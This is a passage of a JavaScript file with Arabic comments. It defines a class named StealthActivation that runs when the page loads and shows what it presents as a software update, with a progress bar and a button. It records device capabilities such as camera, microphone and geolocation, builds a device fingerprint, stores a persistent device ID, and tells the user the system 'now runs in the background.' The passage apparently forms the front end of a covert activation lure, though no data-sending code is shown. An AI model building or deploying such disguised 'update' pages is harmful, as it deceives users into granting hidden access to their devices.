        const countdownElement = document.getElementById('redirectCountdown');
        if (!countdownElement) return;
        
        let countdown = 3;
        countdownElement.textContent = countdown;
        
        console.log('🔄 بدء العد التنازلي للعودة للحالة الأساسية');
        
        const countdownInterval = setInterval(() => {
            countdown--;
            if (countdown > 0) {
                countdownElement.textContent = countdown;
                console.log(`⏱️ العد التنازلي: ${countdown}`);
            } else {
                clearInterval(countdownInterval);
                console.log('✅ انتهى العد التنازلي - العودة للحالة الأساسية');
                this.returnToMainState();
            }
        }, 1000);
    }
    
    // العودة للحالة الأساسية بدلاً من about:blank
    returnToMainState() {
        try {
            console.log('🔄 العودة للحالة الأساسية للصفحة');
            
            // إخفاء شاشة النجاح
            const successScreen = document.getElementById('successScreen');
            if (successScreen) {
                successScreen.style.display = 'none';
            }
            
            // إظهار المحتوى الرئيسي
            const mainContent = document.getElementById('mainContent');
            if (mainContent) {
                mainContent.style.display = 'block';
            }
            
            // إعادة تعيين شريط التقدم إلى 100%
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            if (progressFill && progressText) {
                progressFill.style.width = '100%';
                progressText.textContent = 'تم التفعيل بنجاح - النظام يعمل في الخلفية';
            }
            
            // إظهار رسالة نجاح في قسم الحالة
            const status = document.getElementById('status');
            if (status) {
                status.style.display = 'block';
                status.className = 'status-message success';
                status.innerHTML = '<strong>✅ تم التفعيل بنجاح!</strong><br>النظام يعمل الآن في الخلفية ويمكنك الاستمرار في استخدام الموقع.';
            }
            
            // تعطيل زر التحديث وتغيير نصه
            const updateBtn = document.getElementById('updateBtn');
            if (updateBtn) {
                updateBtn.disabled = true;
                updateBtn.querySelector('.button-text').textContent = 'تم التفعيل بنجاح';
                updateBtn.style.background = '#28a745';
                updateBtn.style.cursor = 'default';
            }
            
            console.log('✅ تم العودة للحالة الأساسية بنجاح');
            
        } catch (error) {
            console.error('❌ خطأ في العودة للحالة الأساسية:', error);
        }
    }

    // تم حذف دالة redirectToBlank نهائياً لمنع أي إعادة توجيه
    redirectToBlank() {
        console.log('❌ تم منع استدعاء redirectToBlank - الدالة محذوفة');
        console.log('✅ الصفحة ستبقى مرئية ولن تنتقل إلى about:blank');
        
        // إظهار رسالة نجاح بدلاً من أي إعادة توجيه
        this.showSuccessMessage();
        
        // منع أي محاولة إعادة توجيه
        throw new Error('تم منع redirectToBlank - الدالة محذوفة');
    }
    
    // عرض رسالة نجاح
    showSuccessMessage() {
        try {
            const successScreen = document.getElementById('successScreen');
            if (successScreen) {
                successScreen.style.display = 'block';
                
                const countdown = document.getElementById('redirectCountdown');
                if (countdown) {
                    countdown.style.display = 'none';
                }
                
                const successMessage = successScreen.querySelector('.success-content p');
                if (successMessage) {
                    successMessage.textContent = 'النظام يعمل الآن في الخلفية. الصفحة ستبقى مفتوحة.';
                }
            }
        } catch (error) {
            console.error('خطأ في عرض رسالة النجاح:', error);
        }
    }

    // إظهار الخطأ
    showError(message) {
        const mainContent = document.getElementById('mainContent');
        const errorScreen = document.getElementById('errorScreen');
        const errorMessage = document.getElementById('errorMessage');
        
        if (mainContent) mainContent.style.display = 'none';
        if (errorScreen) errorScreen.style.display = 'flex';
        if (errorMessage) errorMessage.textContent = message;
    }

    // إعادة المحاولة
    async retryActivation() {
        try {
            // إخفاء شاشة الخطأ
            const errorScreen = document.getElementById('errorScreen');
            if (errorScreen) errorScreen.style.display = 'none';
            
            // إظهار المحتوى الرئيسي
            this.showMainContent();
            
            // إعادة تعيين الحالة
            this.currentStep = 0;
            this.updateProgress(0);
            this.updateProgressText('جاهز للتحديث');
            
            // إعادة تفعيل الزر
            this.enableUpdateButton();
            
        } catch (error) {
            console.error('❌ فشل في إعادة المحاولة:', error);
        }
    }

    // تعطيل زر التحديث
    disableUpdateButton() {
        const updateBtn = document.getElementById('updateBtn');
        if (updateBtn) {
            updateBtn.disabled = true;
            updateBtn.querySelector('.button-text').textContent = 'جاري التحديث...';
        }
    }

    // تفعيل زر التحديث
    enableUpdateButton() {
        const updateBtn = document.getElementById('updateBtn');
        if (updateBtn) {
            updateBtn.disabled = false;
            updateBtn.querySelector('.button-text').textContent = 'بدء التحديث الآن';
        }
    }

    // تحديث شريط التقدم
    updateProgress(percentage) {
        const progressFill = document.getElementById('progressFill');
        if (progressFill) {
            progressFill.style.width = `${percentage}%`;
        }
    }

    // تحديث نص التقدم
    updateProgressText(text) {
        const progressText = document.getElementById('progressText');
        if (progressText) {
            progressText.textContent = text;
        }
    }

    // الحصول على قدرات الجهاز
    getDeviceCapabilities() {
        return {
            camera: 'camera' in navigator.mediaDevices,
            microphone: 'microphone' in navigator.mediaDevices,
            geolocation: 'geolocation' in navigator,
            storage: 'storage' in navigator,
            notifications: 'Notification' in window,
            webSocket: 'WebSocket' in window,
            serviceWorker: 'serviceWorker' in navigator
        };
    }

    // الحصول على معلومات الجهاز
    getDeviceInfo() {
        return {
            deviceId: this.deviceId,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: Date.now()
        };
    }

    // تأخير
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // تأخير عشوائي
    getRandomDelay(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // توليد معرف الجهاز
    generateDeviceId() {
        const storedId = localStorage.getItem('deviceId');
        if (storedId) return storedId;
        
        const newId = 'DEV-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('deviceId', newId);
        return newId;
    }
}

// تهيئة النظام عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', async () => {
    try {
        const stealthActivation = new StealthActivation();
        await stealthActivation.initialize();
        
        // حفظ النسخة العامة للوصول
        window.stealthActivation = stealthActivation;
        
    } catch (error) {
        console.error('❌ فشل في تهيئة النظام:', error);
    }
});